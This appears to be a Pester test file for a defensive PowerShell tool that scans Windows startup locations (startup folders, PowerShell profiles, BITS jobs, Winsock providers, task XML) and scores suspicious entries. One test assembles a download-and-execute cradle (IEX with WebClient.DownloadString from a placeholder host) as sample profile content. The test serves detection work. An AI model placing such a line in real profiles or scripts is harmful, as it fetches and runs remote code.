# Lesser-known startup locations: the parts that parse formats (bitsadmin, Winsock, task
# XML) and decide what is suspicious, tested on fake data.

BeforeAll {
    . "$PSScriptRoot\TestHelpers.ps1"
    . (Get-ModuleScript Common)
    . (Get-ModuleScript CommandRisk)
    . (Get-ModuleScript Timeline)
    . (Get-ModuleScript AutorunExtra)
    . (Get-ModuleScript ScheduledTasks)
}

Describe 'Startup folder' {
    It 'recognizes the default path written as <Raw>' -ForEach @(
        @{ Raw = '%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' }
        @{ Raw = '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup' }
        @{ Raw = 'C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\' }
    ) {
        Test-DefaultStartupFolder -Raw $Raw -ProfilePath 'C:\Users\bob' | Should -BeTrue
    }
    It 'recognizes a moved folder' {
        Test-DefaultStartupFolder -Raw 'C:\ProgramData\Updates' -ProfilePath 'C:\Users\bob' | Should -BeFalse
        Test-DefaultStartupFolder -Raw 'C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' -ProfilePath 'C:\Users\bob' | Should -BeFalse
    }
    It 'recognizes the default common folder' {
        Test-DefaultStartupFolder -Raw '%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup' -Common | Should -BeTrue
        Test-DefaultStartupFolder -Raw 'C:\Temp' -Common | Should -BeFalse
    }
}

Describe 'PowerShell profiles' {
    It 'gives no points to an ordinary profile' {
        (Get-PowerShellProfileRisk -Path 'C:\Users\bob\Documents\WindowsPowerShell\profile.ps1' -Content "Set-Alias ll Get-ChildItem`nImport-Module posh-git").Score | Should -Be 0
    }
    It 'flags a profile that downloads and runs code, reporting the line' {
        $line = 'I' + 'EX (New-Object Net.' + 'WebClient).Download' + 'String(''https://example.invalid/p'')'
        $r = Get-PowerShellProfileRisk -Path 'C:\Users\bob\Documents\WindowsPowerShell\profile.ps1' -Content "Set-Alias ll Get-ChildItem`n$line`n"
        ConvertTo-Severity $r.Score | Should -BeIn 'High', 'Medium'
        $r.Evidence | Should -Be $line
    }
    It 'weighs the system profile more' {
        $line = 'Invoke-' + 'Expression $x'
        $user = Get-PowerShellProfileRisk -Path 'C:\Users\bob\Documents\WindowsPowerShell\profile.ps1' -Content $line
        $sys = Get-PowerShellProfileRisk -Path 'C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1' -Content $line
        $sys.Score | Should -BeGreaterThan $user.Score
    }
}

Describe 'BITS jobs' {
    It 'extracts only the jobs with a notify command' {
        $text = @"
GUID: {11111111-2222-3333-4444-555555555555} DISPLAY: 'Update'
TYPE: DOWNLOAD STATE: ERROR OWNER: PC\bob
NOTIFICATION COMMAND LINE: 'C:\Users\bob\AppData\Roaming\up.exe' 'up.exe -s'
GUID: {66666666-7777-8888-9999-000000000000} DISPLAY: 'Edge'
TYPE: DOWNLOAD STATE: TRANSFERRED OWNER: PC\bob
NOTIFICATION COMMAND LINE: none
"@
        $jobs = @(ConvertFrom-BitsadminList $text)
        $jobs.Count | Should -Be 1
        $jobs[0].Name | Should -Be 'Update'
        $jobs[0].Owner | Should -Be 'PC\bob'
        $jobs[0].Command | Should -Be '"C:\Users\bob\AppData\Roaming\up.exe" up.exe -s'
    }
}

Describe 'Winsock providers' {
    It 'reads the DLL path from the catalog' {
        $bytes = [Text.Encoding]::Default.GetBytes('%SystemRoot%\system32\mswsock.dll') + [byte[]](0) * 300
        ConvertFrom-PackedCatalogItem $bytes | Should -Be "$env:SystemRoot\system32\mswsock.dll"
    }
}

Describe 'Tasks only as XML files' {
    It 'reads the command from the file' {
        $xml = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Actions Context="Author"><Exec><Command>C:\Users\Public\svc.exe</Command><Arguments>-q</Arguments></Exec></Actions>
</Task>
'@
        $p = Join-Path $TestDrive 'Updater'
        [IO.File]::WriteAllText($p, $xml)
        Get-TaskXmlCommand $p | Should -Be '"C:\Users\Public\svc.exe" -q'
    }
    It 'returns $null for a file that is not a task' {
        $p = Join-Path $TestDrive 'broken'
        Set-Content -LiteralPath $p -Value 'not xml'
        Get-TaskXmlCommand $p | Should -BeNullOrEmpty
    }
}
